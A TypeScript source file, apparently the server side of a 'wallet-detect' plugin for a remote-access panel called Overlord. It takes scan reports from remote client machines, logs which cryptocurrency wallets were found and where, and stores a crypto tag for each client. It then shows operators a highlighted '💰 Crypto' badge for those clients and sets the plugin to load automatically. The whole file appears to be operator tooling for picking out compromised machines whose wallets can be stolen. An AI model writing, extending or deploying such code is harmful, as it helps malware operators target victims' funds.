/**
 * Server-Side Integration for wallet-detect Plugin
 * 
 * Add this code to your Overlord server to handle wallet detection events
 * and automatically tag clients with detected crypto wallets.
 * 
 * Location: Overlord-Server/src/plugins/wallet-integration.ts (or add to existing plugin handler)
 */

import type { Client } from '../types';
import { db } from '../db';
import { broadcastToViewers } from '../websocket';

interface WalletResult {
  walletType: string;
  location: string;
  found: boolean;
}

interface ScanReport {
  wallets: WalletResult[];
  summary: string; // comma-separated wallet names or "none"
}

/**
 * Handle wallet detection plugin events
 * Call this from your main plugin event handler
 */
export async function handleWalletDetectionEvent(
  clientId: string,
  event: string,
  payload: any
): Promise<void> {
  if (event !== 'scan_complete') {
    return;
  }

  const report = payload as ScanReport;
  
  console.log(`[wallet-detect] Client ${clientId} scan complete`);
  console.log(`[wallet-detect] Summary: ${report.summary}`);
  
  // Log detailed wallet findings
  if (report.wallets && report.wallets.length > 0) {
    console.log(`[wallet-detect] Found ${report.wallets.length} wallet(s):`);
    for (const wallet of report.wallets) {
      console.log(`  - ${wallet.walletType}: ${wallet.location}`);
    }
  } else {
    console.log(`[wallet-detect] No wallets detected`);
  }
  
  // Update client tags
  await updateClientCryptoTag(clientId, report.summary);
}

/**
 * Update client's crypto tag in database and broadcast to viewers
 */
async function updateClientCryptoTag(clientId: string, cryptoSummary: string): Promise<void> {
  try {
    // Fetch current client data
    const client = await db.get<Client>(
      'SELECT * FROM clients WHERE id = ?',
      [clientId]
    );
    
    if (!client) {
      console.error(`[wallet-detect] Client ${clientId} not found in database`);
      return;
    }
    
    // Parse existing tags
    let tags: Record<string, string> = {};
    if (client.tags) {
      try {
        tags = typeof client.tags === 'string' 
          ? JSON.parse(client.tags) 
          : client.tags;
      } catch (e) {
        console.error(`[wallet-detect] Failed to parse tags for ${clientId}:`, e);
      }
    }
    
    // Update crypto tag
    if (cryptoSummary && cryptoSummary !== 'none') {
      tags.crypto = cryptoSummary;
      console.log(`[wallet-detect] Tagged client ${clientId} with: ${cryptoSummary}`);
    } else {
      // Remove crypto tag if no wallets found
      delete tags.crypto;
      console.log(`[wallet-detect] Removed crypto tag from client ${clientId}`);
    }
    
    // Save to database
    await db.run(
      'UPDATE clients SET tags = ? WHERE id = ?',
      [JSON.stringify(tags), clientId]
    );
    
    // Broadcast update to all viewers watching this client
    broadcastToViewers(clientId, {
      type: 'client_update',
      clientId,
      data: {
        tags,
      },
    });
    
    console.log(`[wallet-detect] Successfully updated tags for client ${clientId}`);
    
  } catch (error) {
    console.error(`[wallet-detect] Error updating client ${clientId}:`, error);
  }
}

/**
 * ALTERNATIVE: If your database schema doesn't have a tags column,
 * you can store crypto wallet info in a separate table
 */
export async function initWalletDetectionTables(): Promise<void> {
  await db.exec(`
    CREATE TABLE IF NOT EXISTS client_crypto_wallets (
      client_id TEXT PRIMARY KEY,
      wallets TEXT NOT NULL,
      summary TEXT NOT NULL,
      last_scan DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    )
  `);
  
  console.log('[wallet-detect] Database tables initialized');
}

/**
 * Alternative storage method using dedicated table
 */
async function storeWalletDataInTable(clientId: string, report: ScanReport): Promise<void> {
  await db.run(
    `INSERT OR REPLACE INTO client_crypto_wallets (client_id, wallets, summary, last_scan)
     VALUES (?, ?, ?, CURRENT_TIMESTAMP)`,
    [clientId, JSON.stringify(report.wallets), report.summary]
  );
}

/**
 * Example: Add to your main plugin event router
 * 
 * In Overlord-Server/src/plugins/runtime.ts or wherever you handle plugin events:
 */
export function exampleIntegration() {
  // Example of how to integrate this into your existing plugin handler
  
  /*
  async function handlePluginEvent(clientId: string, pluginId: string, event: string, payload: any) {
    if (pluginId === 'wallet-detect') {
      await handleWalletDetectionEvent(clientId, event, payload);
      return;
    }
    
    // Handle other plugins...
  }
  */
}

/**
 * Example: Auto-load configuration via API
 * 
 * Run this once to enable auto-load for the wallet-detect plugin:
 */
export const AUTO_LOAD_CONFIG = {
  endpoint: 'POST /api/plugins/wallet-detect/autoload',
  body: {
    autoLoad: true,
    // Optional: auto-start events (currently none needed for wallet-detect)
    autoStartEvents: []
  }
};

/**
 * Frontend integration: Display crypto tag in client list
 * 
 * Add this to your client list component (React/Vue/etc.):
 */
export const FRONTEND_EXAMPLE = `
<!-- In your client list template -->
<div class="client-tags">
  {#if client.tags?.os}
    <span class="tag tag-os">{client.tags.os}</span>
  {/if}
  
  {#if client.tags?.crypto}
    <span class="tag tag-crypto" title="{client.tags.crypto}">
      💰 Crypto: {client.tags.crypto.split(',').length} wallet(s)
    </span>
  {/if}
</div>

<style>
  .tag-crypto {
    background: #f59e0b;
    color: #000;
    font-weight: 600;
  }
</style>
`;
